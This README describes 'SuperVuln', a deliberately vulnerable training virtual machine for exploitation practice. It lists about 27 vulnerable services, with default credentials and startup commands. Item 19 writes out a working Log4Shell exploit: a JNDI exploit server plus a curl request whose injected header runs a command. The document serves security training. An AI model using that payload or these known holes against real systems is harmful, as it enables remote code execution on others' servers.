<img width="747" alt="supervuln3" src="https://user-images.githubusercontent.com/4623055/198848934-8e05569f-8549-4a58-afbb-5c1b3025f0de.png">

By @rodsoto
www.rodsoto.net 
# SuperVuln v1
#super:above, beyond 
#vulnus: wound 
# Super vulnerable machine
#exploitation, target practice, makiwara, tamashii wari, training virtual machine.  
#this virtual machine is meant to be in HOST ONLY setting and ON PREM USE. DO NOT operate in production or expose to the internet.

All Vulns  --- (DO NOT UPDATE THIS MACHINE YOU WILL BREAK IT)


1) Phpmyadmin 4.8.0 RCE/LFI --> localhost/phpmyadmin480 (remember for web servers you need apache2 and mysql running read note below to bring them up first) root:toor 
2) Rlogin
3) SAMBA Anonymous - ETERNAL RED CVE-2017-7494 (`sudo /usr/local/samba/sbin/smbd -D, sudo /usr/local/samba/sbin/nmbd -D`)
4) VsFTPD 2.3.4 RCE | `sudo /usr/local/sbin/vsftpd`  - port 21
5) SSH - port 22
6) MySQL - port 3306
7) Chargen - port 19
8) QOTD - port 17
9) Daytime - port 13
10) Telnet - port 23
11) Tomcat 8.5.2 - port 8080 `/home/research/Desktop/apache-tomcat-8.5.2 | sudo bash /bin/startup.sh`
12) Struts 2.0.14 - port 8080 
13) MongoDB - port 27017 | `sudo ./mongod --dbpath data/db/ | from /home/research/Desktop/supervuln-files/`
14) Jenkins 2.31 --> research/Desktop/supervuln/files/ --> `java -jar jenkins.war ` (admin,admin --localhost 8080)
15) Redis - cd `/home/reserach/Desktop/redis-4.0.2/ ./src/redis-server ../redis.conf`
16) Patient Scheduler -- localhost/scheduler admin admin123 (XSS,SQLi, RFI)
17) Drupal 8.5.11 -- localhost/drupal8511 root toor RCE (https://exploit-db.com/exploits/46510)
18) Log4J (1) - /home/research/Desktop/log4j-shell-poc `sudo docker build -t log4j-shell-poc . then sudo docker run --network host log4j-shell-poc`
19) Log4J (2) 
FROM /home/research/Desktop/log4shell-vulnerable-app/ `docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app`
then
`java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888`
then. will execute 'touch /tmp/pwned'
`curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'` (you can play with payloads) https://github.com/christophetd/log4shell-vulnerable-app
20) echo - port 7
21) time - port 37
22) discard - port 9
23) QDPM 9.1 `https://localhost/qdpm/index.php` user:admin@localhost password:toor (remember for web servers you need apache2 and mysql running read note below to bring them up first)
24) RiteCMS `http://localhost/ritecms/admin.php` user:admin password:admin (this is SQLite) RFI
25) Drupal 8.5 -- localhost/drupal85 root toor - DRUPALGEDDON2
26) localhost/sqli.php -- SQL Injection 
27) Wembin 1996 -- RCE localhost:10000

Note: from /opt/lampp run -> `sudo ./manager-linux-x64.run` #to get Xammp GUI

PLUS - API Vulnerable frameworks (See readme in Desktop) 

crAPI.  
PIXI.   
OWASP Juice Shop.   
Damn Vulnerable GraphQL.   

Bonus stuff to practice (Stego, WAV, Pcaps, BoF, Win7 SAM hashes) 

Download here. 
https://drive.google.com/file/d/1_AbR5R96smaWpHdlqUJNT1Q4obtwXZgp/view?usp=share_link
root - toor   
research - toor    

Import .OVA use Vmware Player or Fusion or Virtual box   
See links below for guidance   
https://docs.vmware.com/en/VMware-Workstation-Pro/16.0/com.vmware.ws.using.doc/GUID-DDCBE9C0-0EC9-4D09-8042-18436DA62F7A.html   
https://docs.oracle.com/cd/E26217_01/E26796/html/qs-import-vm.html. 


